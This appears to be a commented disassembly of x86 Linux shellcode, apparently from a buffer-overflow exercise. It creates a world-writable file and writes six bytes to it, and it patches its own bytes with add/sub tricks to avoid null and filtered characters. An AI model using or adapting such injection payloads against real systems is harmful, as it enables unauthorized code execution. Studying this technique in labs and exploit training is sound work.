# file create
   0:   31 c0                   xor    %eax,%eax
   2:   b0 08                   mov    $0x8,%al
   4:   bb 60 4c 48 55          mov    $0x55484c60,%ebx
# to end filename with 00
   9:   81 43 04 10 10 10 01    addl   $0x1101010,0x4(%ebx)
  10:   81 6b 04 10 10 10 91    subl   $0x91101010,0x4(%ebx)
  17:   31 c9                   xor    %ecx,%ecx
  19:   66 b9 ff 01             mov    $0x1ff,%cx
  1d:   cd 80                   int    $0x80
# file write
  1f:   89 c3                   mov    %eax,%ebx
  21:   31 c0                   xor    %eax,%eax
  23:   b0 04                   mov    $0x4,%al
  25:   b9 80 4c 48 55          mov    $0x55484c80,%ecx
# change '1' to 'I' which was replaced in handler0
  2a:   81 01 19 01 01 01       addl   $0x1010119,(%ecx)
  30:   81 29 01 01 01 01       subl   $0x1010101,(%ecx)
  36:   31 d2                   xor    %edx,%edx
  38:   b2 06                   mov    $0x6,%dl
  3a:   cd 80                   int    $0x80
